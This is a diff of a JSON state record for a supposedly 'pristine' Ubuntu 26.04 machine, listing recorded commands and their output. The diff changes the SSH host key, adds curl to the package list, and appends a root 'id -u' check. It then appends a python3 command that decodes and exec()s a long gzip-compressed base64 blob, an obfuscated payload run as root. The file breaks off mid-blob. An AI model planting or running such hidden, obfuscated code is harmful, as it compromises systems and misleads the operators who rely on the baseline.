@@ -2,13 +2,16 @@
   "format": 1,
   "state": "pristine-26.04",
   "pins": {
+    "catalog-sha256": "d7cc832836e0a8e7858be3a3a163640510a1600fa85b88146504257002105bd2",
+    "nix-version": "2.35.2",
+    "nixpkgs": "7c8764b7c7b09b34f632464276218ef9090eaa11",
     "ubuntu-24.04": "ubuntu:24.04@sha256:534baea6a22c03a63003dbc8dbe78fe34bc0d7e595d9a9dc9834884ff530eb55",
     "ubuntu-26.04": "ubuntu:26.04@sha256:da6fc2be547864451aa253836dd926da33623312df4a9a243e35dc877c378a78"
   },
   "recorded": {
     "release": "26.04",
     "architecture": "aarch64",
-    "host_key": "ssh-ed25519 SHA256:QrfP6ODaJ2eCn9xUIdiH38FQPDrkXBQsclMXqFzsh3E"
+    "host_key": "ssh-ed25519 SHA256:K4Skp/pKvbV6d+gyQ3B7kVqK2+Plc/E2Rr7n/ltccw0"
   },
   "commands": [
     {
@@ -35,14 +38,14 @@
     {
       "command": "cat /proc/meminfo",
       "exit": 0,
-      "stdout": "MemTotal:       16424100 kB\nMemFree:        13719576 kB\nMemAvailable:   14386768 kB\nBuffers:             156 kB\nCached:           562776 kB\nSwapCached:            0 kB\nActive:           703908 kB\nInactive:        1261540 kB\nActive(anon):     660948 kB\nInactive(anon):   764164 kB\nActive(file):      42960 kB\nInactive(file):   497376 kB\nUnevictable:           0 kB\nMlocked:               0 kB\nSwapTotal:      17472668 kB\nSwapFree:       17472668 kB\nDirty:               636 kB\nWriteback:             0 kB\nAnonPages:       1389508 kB\nMapped:           135176 kB\nShmem:             22644 kB\nKReclaimable:     384032 kB\nSlab:             532832 kB\nSReclaimable:     384032 kB\nSUnreclaim:       148800 kB\nKernelStack:        9424 kB\nPageTables:        11024 kB\nSecPageTables:         0 kB\nNFS_Unstable:          0 kB\nBounce:                0 kB\nWritebackTmp:          0 kB\nCommitLimit:    25684716 kB\nCommitted_AS:    3103768 kB\nVmallocTotal:   135288315904 kB\nVmallocUsed:       71448 kB\nVmallocChunk:          0 kB\nPercpu:            11032 kB\nAnonHugePages:     22528 kB\nShmemHugePages:        0 kB\nShmemPmdMapped:        0 kB\nFileHugePages:         0 kB\nFilePmdMapped:         0 kB\nBalloon:               0 kB\nGPUActive:             0 kB\nGPUReclaim:            0 kB\n",
+      "stdout": "MemTotal:       16424100 kB\nMemFree:        11427316 kB\nMemAvailable:   13482476 kB\nBuffers:             144 kB\nCached:           568348 kB\nSwapCached:            0 kB\nActive:          1050512 kB\nInactive:        1324132 kB\nActive(anon):     839320 kB\nInactive(anon):   995884 kB\nActive(file):     211192 kB\nInactive(file):   328248 kB\nUnevictable:           0 kB\nMlocked:               0 kB\nSwapTotal:      17472668 kB\nSwapFree:       17472668 kB\nDirty:              1848 kB\nWriteback:             0 kB\nAnonPages:       1771636 kB\nMapped:           174328 kB\nShmem:             29180 kB\nKReclaimable:    1772896 kB\nSlab:            2196256 kB\nSReclaimable:    1772896 kB\nSUnreclaim:       423360 kB\nKernelStack:       12864 kB\nPageTables:       129756 kB\nSecPageTables:         0 kB\nNFS_Unstable:          0 kB\nBounce:                0 kB\nWritebackTmp:          0 kB\nCommitLimit:    25684716 kB\nCommitted_AS:    6021348 kB\nVmallocTotal:   135288315904 kB\nVmallocUsed:       72700 kB\nVmallocChunk:          0 kB\nPercpu:            18536 kB\nAnonHugePages:    116736 kB\nShmemHugePages:        0 kB\nShmemPmdMapped:        0 kB\nFileHugePages:         0 kB\nFilePmdMapped:         0 kB\nBalloon:               0 kB\nGPUActive:             0 kB\nGPUReclaim:            0 kB\n",
       "truncated": false,
       "stdin_sha256": null
     },
     {
       "command": "df -B1 --output=size,avail,target /",
       "exit": 0,
-      "stdout": "   1B-blocks        Avail Mounted on\n628474511360 573326196736 /\n",
+      "stdout": "   1B-blocks        Avail Mounted on\n621495189504 542173331456 /\n",
       "truncated": false,
       "stdin_sha256": null
     },
@@ -56,7 +59,7 @@
     {
       "command": "dpkg-query -W -f='${Package} ${db:Status-Abbrev}\\n'",
       "exit": 0,
-      "stdout": "adduser ii \napt ii \nbase-files ii \nbase-passwd ii \nbash ii \nbsdutils ii \nca-certificates ii \ncoreutils ii \ncoreutils-from-uutils ii \ndash ii \ndbus ii \ndbus-bin ii \ndbus-daemon ii \ndbus-session-bus-common ii \ndbus-system-bus-common ii \ndebconf ii \ndebianutils ii \ndiffutils ii \ndpkg ii \ne2fsprogs ii \nfindutils ii \ngcc-16-base ii \ngnu-coreutils ii \ngpgv ii \ngrep ii \ngzip ii \nhostname ii \ninit-system-helpers ii \niproute2 ii \nlibacl1 ii \nlibapparmor1 ii \nlibapt-pkg7.0 ii \nlibattr1 ii \nlibaudit-common ii \nlibaudit1 ii \nlibblkid1 ii \nlibbpf1 ii \nlibbsd0 ii \nlibbz2-1.0 ii \nlibc-bin ii \nlibc-gconv-modules-extra ii \nlibc6 ii \nlibcap-ng0 ii \nlibcap2 ii \nlibcap2-bin ii \nlibcbor0.10 ii \nlibcom-err2 ii \nlibcrypt1 ii \nlibdb5.3t64 ii \nlibdbus-1-3 ii \nlibdebconfclient0 ii \nlibedit2 ii \nlibelf1t64 ii \nlibestr0 ii \nlibexpat1 ii \nlibext2fs2t64 ii \nlibfastjson4 ii \nlibffi8 ii \nlibfido2-1 ii \nlibgcc-s1 ii \nlibgcrypt20 ii \nlibgmp10 ii \nlibgpg-error0 ii \nlibgssapi-krb5-2 ii \nlibk5crypto3 ii \nlibkeyutils1 ii \nlibkrb5-3 ii \nlibkrb5support0 ii \nliblz4-1 ii \nliblzma5 ii \nlibmd0 ii \nlibmnl0 ii \nlibmount1 ii \nlibncursesw6 ii \nlibpam-modules ii \nlibpam-modules-bin ii \nlibpam-runtime ii \nlibpam0g ii \nlibpcre2-8-0 ii \nlibproc2-0 ii \nlibpython3-stdlib ii \nlibpython3.14-minimal ii \nlibpython3.14-stdlib ii \nlibreadline8t64 ii \nlibseccomp2 ii \nlibselinux1 ii \nlibsemanage-common ii \nlibsemanage2 ii \nlibsepol2 ii \nlibsmartcols1 ii \nlibsqlite3-0 ii \nlibss2 ii \nlibssl3t64 ii \nlibstdc++6 ii \nlibsystemd-shared ii \nlibsystemd0 ii \nlibtext-charwidth-perl ii \nlibtext-wrapi18n-perl ii \nlibtinfo6 ii \nlibtirpc-common ii \nlibtirpc3t64 ii \nlibudev1 ii \nlibuuid1 ii \nlibwrap0 ii \nlibxtables12 ii \nlibxxhash0 ii \nlibzstd1 ii \nlogin ii \nlogin.defs ii \nlogsave ii \nmawk ii \nmedia-types ii \nmount ii \nncurses-base ii \nncurses-bin ii \nnetbase ii \nopenssh-client ii \nopenssh-server ii \nopenssh-sftp-server ii \nopenssl ii \nopenssl-provider-legacy ii \npasswd ii \nperl-base ii \nprocps ii \npython3 ii \npython3-minimal ii \npython3.14 ii \npython3.14-minimal ii \nreadline-common ii \nrsyslog ii \nrust-coreutils ii \nsed ii \nsensible-utils ii \nsudo ii \nsudo-common ii \nsudo-rs ii \nsystemd ii \nsysvinit-utils ii \ntar ii \ntzdata ii \nubuntu-keyring ii \nucf ii \nutil-linux ii \nxz-utils ii \nzlib1g ii \n",
+      "stdout": "adduser ii \napt ii \nbase-files ii \nbase-passwd ii \nbash ii \nbsdutils ii \nca-certificates ii \ncoreutils ii \ncoreutils-from-uutils ii \ncurl ii \ndash ii \ndbus ii \ndbus-bin ii \ndbus-daemon ii \ndbus-session-bus-common ii \ndbus-system-bus-common ii \ndebconf ii \ndebianutils ii \ndiffutils ii \ndpkg ii \ne2fsprogs ii \nfindutils ii \ngcc-16-base ii \ngnu-coreutils ii \ngpgv ii \ngrep ii \ngzip ii \nhostname ii \ninit-system-helpers ii \niproute2 ii \nlibacl1 ii \nlibapparmor1 ii \nlibapt-pkg7.0 ii \nlibattr1 ii \nlibaudit-common ii \nlibaudit1 ii \nlibblkid1 ii \nlibbpf1 ii \nlibbrotli1 ii \nlibbsd0 ii \nlibbz2-1.0 ii \nlibc-bin ii \nlibc-gconv-modules-extra ii \nlibc6 ii \nlibcap-ng0 ii \nlibcap2 ii \nlibcap2-bin ii \nlibcbor0.10 ii \nlibcom-err2 ii \nlibcrypt1 ii \nlibcurl4t64 ii \nlibdb5.3t64 ii \nlibdbus-1-3 ii \nlibdebconfclient0 ii \nlibedit2 ii \nlibelf1t64 ii \nlibestr0 ii \nlibexpat1 ii \nlibext2fs2t64 ii \nlibfastjson4 ii \nlibffi8 ii \nlibfido2-1 ii \nlibgcc-s1 ii \nlibgcrypt20 ii \nlibgmp10 ii \nlibgnutls30t64 ii \nlibgpg-error0 ii \nlibgssapi-krb5-2 ii \nlibhogweed6t64 ii \nlibidn2-0 ii \nlibk5crypto3 ii \nlibkeyutils1 ii \nlibkrb5-3 ii \nlibkrb5support0 ii \nlibldap-common ii \nlibldap2 ii \nliblz4-1 ii \nliblzma5 ii \nlibmd0 ii \nlibmnl0 ii \nlibmount1 ii \nlibncursesw6 ii \nlibnettle8t64 ii \nlibnghttp2-14 ii \nlibp11-kit0 ii \nlibpam-modules ii \nlibpam-modules-bin ii \nlibpam-runtime ii \nlibpam0g ii \nlibpcre2-8-0 ii \nlibproc2-0 ii \nlibpsl5t64 ii \nlibpython3-stdlib ii \nlibpython3.14-minimal ii \nlibpython3.14-stdlib ii \nlibreadline8t64 ii \nlibrtmp1 ii \nlibsasl2-2 ii \nlibsasl2-modules-db ii \nlibseccomp2 ii \nlibselinux1 ii \nlibsemanage-common ii \nlibsemanage2 ii \nlibsepol2 ii \nlibsmartcols1 ii \nlibsqlite3-0 ii \nlibss2 ii \nlibssh2-1t64 ii \nlibssl3t64 ii \nlibstdc++6 ii \nlibsystemd-shared ii \nlibsystemd0 ii \nlibtasn1-6 ii \nlibtext-charwidth-perl ii \nlibtext-wrapi18n-perl ii \nlibtinfo6 ii \nlibtirpc-common ii \nlibtirpc3t64 ii \nlibudev1 ii \nlibunistring5 ii \nlibuuid1 ii \nlibwrap0 ii \nlibxtables12 ii \nlibxxhash0 ii \nlibzstd1 ii \nlogin ii \nlogin.defs ii \nlogsave ii \nmawk ii \nmedia-types ii \nmount ii \nncurses-base ii \nncurses-bin ii \nnetbase ii \nopenssh-client ii \nopenssh-server ii \nopenssh-sftp-server ii \nopenssl ii \nopenssl-provider-legacy ii \npasswd ii \nperl-base ii \nprocps ii \npython3 ii \npython3-minimal ii \npython3.14 ii \npython3.14-minimal ii \nreadline-common ii \nrsyslog ii \nrust-coreutils ii \nsed ii \nsensible-utils ii \nsudo ii \nsudo-common ii \nsudo-rs ii \nsystemd ii \nsysvinit-utils ii \ntar ii \ntzdata ii \nubuntu-keyring ii \nucf ii \nutil-linux ii \nxz-utils ii \nzlib1g ii \n",
       "truncated": false,
       "stdin_sha256": null
     },
@@ -91,7 +94,28 @@
     {
       "command": "cat /proc/meminfo",
       "exit": 0,
-      "stdout": "MemTotal:       16424100 kB\nMemFree:        13706872 kB\nMemAvailable:   14374064 kB\nBuffers:             156 kB\nCached:           562776 kB\nSwapCached:            0 kB\nActive:           703844 kB\nInactive:        1261540 kB\nActive(anon):     660884 kB\nInactive(anon):   764164 kB\nActive(file):      42960 kB\nInactive(file):   497376 kB\nUnevictable:           0 kB\nMlocked:               0 kB\nSwapTotal:      17472668 kB\nSwapFree:       17472668 kB\nDirty:               636 kB\nWriteback:             0 kB\nAnonPages:       1389428 kB\nMapped:           134788 kB\nShmem:             22644 kB\nKReclaimable:     384032 kB\nSlab:             532832 kB\nSReclaimable:     384032 kB\nSUnreclaim:       148800 kB\nKernelStack:        9472 kB\nPageTables:        16104 kB\nSecPageTables:         0 kB\nNFS_Unstable:          0 kB\nBounce:                0 kB\nWritebackTmp:          0 kB\nCommitLimit:    25684716 kB\nCommitted_AS:    3103848 kB\nVmallocTotal:   135288315904 kB\nVmallocUsed:       71448 kB\nVmallocChunk:          0 kB\nPercpu:            11032 kB\nAnonHugePages:     22528 kB\nShmemHugePages:        0 kB\nShmemPmdMapped:        0 kB\nFileHugePages:         0 kB\nFilePmdMapped:         0 kB\nBalloon:               0 kB\nGPUActive:             0 kB\nGPUReclaim:            0 kB\n",
+      "stdout": "MemTotal:       16424100 kB\nMemFree:        11423012 kB\nMemAvailable:   13478316 kB\nBuffers:             144 kB\nCached:           568468 kB\nSwapCached:            0 kB\nActive:          1054276 kB\nInactive:        1324276 kB\nActive(anon):     843084 kB\nInactive(anon):   995884 kB\nActive(file):     211192 kB\nInactive(file):   328392 kB\nUnevictable:           0 kB\nMlocked:               0 kB\nSwapTotal:      17472668 kB\nSwapFree:       17472668 kB\nDirty:              1840 kB\nWriteback:             0 kB\nAnonPages:       1775340 kB\nMapped:           174740 kB\nShmem:             29180 kB\nKReclaimable:    1772896 kB\nSlab:            2198464 kB\nSReclaimable:    1772896 kB\nSUnreclaim:       425568 kB\nKernelStack:       13072 kB\nPageTables:       132892 kB\nSecPageTables:         0 kB\nNFS_Unstable:          0 kB\nBounce:                0 kB\nWritebackTmp:          0 kB\nCommitLimit:    25684716 kB\nCommitted_AS:    6032148 kB\nVmallocTotal:   135288315904 kB\nVmallocUsed:       72704 kB\nVmallocChunk:          0 kB\nPercpu:            18648 kB\nAnonHugePages:    116736 kB\nShmemHugePages:        0 kB\nShmemPmdMapped:        0 kB\nFileHugePages:         0 kB\nFilePmdMapped:         0 kB\nBalloon:               0 kB\nGPUActive:             0 kB\nGPUReclaim:            0 kB\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "id -u",
+      "exit": 0,
+      "stdout": "0\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "python3 -c 'import base64,gzip; exec(gzip.decompress(base64.b64decode('\"'\"'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